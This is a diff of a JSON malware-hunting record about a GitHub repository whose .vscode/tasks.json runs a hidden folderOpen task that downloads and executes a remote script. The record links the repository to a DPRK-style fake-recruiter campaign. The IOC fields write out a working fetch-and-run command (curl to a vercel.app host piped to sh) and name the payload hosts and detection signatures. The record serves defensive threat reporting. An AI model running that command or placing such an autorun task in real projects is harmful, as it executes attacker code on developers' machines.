@@ -17,12 +17,12 @@
     "evidence_locations": ".vscode/tasks.json:0",
     "c2_hosts": "vscode-helper171-ruby.vercel.app",
     "iocs": "vscode-helper171-ruby.vercel.app; https://vscode-helper171-ruby.vercel.app/settings/mac?flag=4; https://vscode-helper171-ruby.vercel.app/settings/linux?flag=4; curl 'https://vscode-helper171-ruby.vercel.app/settings/mac?flag=4' | sh; .vscode/tasks.json",
-    "matched_signatures": "settings/linux?flag=; settings/mac?flag=; settings/windows?flag=",
-    "reasons": "Shares a confirmed-malware code signature ['settings/linux?flag=', 'settings/mac?flag=', 'settings/windows?flag='] | Tier-2 confirmed (bash score 5)",
-    "osm_status": "submitted",
-    "osm_threat_id": "7f36230a-efcb-47d2-bcb1-71d6a49b6af1",
-    "first_seen": "hunt-20260925T180103Z",
-    "last_seen": "hunt-20260925T180103Z",
+    "matched_signatures": "folderOpen curl filename:tasks.json",
+    "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 5)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/shri33_crypto-trading-platform.json",
     "reviewer_decision": "",
     "notes": ""
@@ -48,7 +48,7 @@
     "report_type": "repository",
     "resource_identifier": "https://github.com/shri33/crypto-trading-platform",
     "version_info": "all",
-    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-helper171-ruby.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-helper171-ruby.vercel.app.\nCampaign GW-C-498a0aeb: one of 86 confirmed repos across 58 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including 260120.vercel.app, default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape.\nFound by GitHub code search for a confirmed malware signature: settings/linux?flag=; settings/mac?flag=; settings/windows?flag=.\nConfirmed by static analysis; the code was read, never executed.",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-helper171-ruby.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-helper171-ruby.vercel.app.\nCampaign GW-C-498a0aeb: one of 81 confirmed repos across 69 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
     "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from vscode-helper171-ruby.vercel.app and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: vscode-helper171-ruby.vercel.app",
     "publisher": "shri33",
     "severity_level": "critical",
@@ -62,7 +62,7 @@
     "evidence_references": "https://github.com/shri33/crypto-trading-platform/blob/9fdaf0c4a8b90f8dd07701a167e4442f5989dd23/.vscode/tasks.json",
     "verified_iocs": "vscode-helper171-ruby.vercel.app\nhttps://vscode-helper171-ruby.vercel.app/settings/mac?flag=4\nhttps://vscode-helper171-ruby.vercel.app/settings/linux?flag=4\ncurl 'https://vscode-helper171-ruby.vercel.app/settings/mac?flag=4' | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T18:01:03Z",
-    "last_seen": "2026-09-25T18:01:03Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
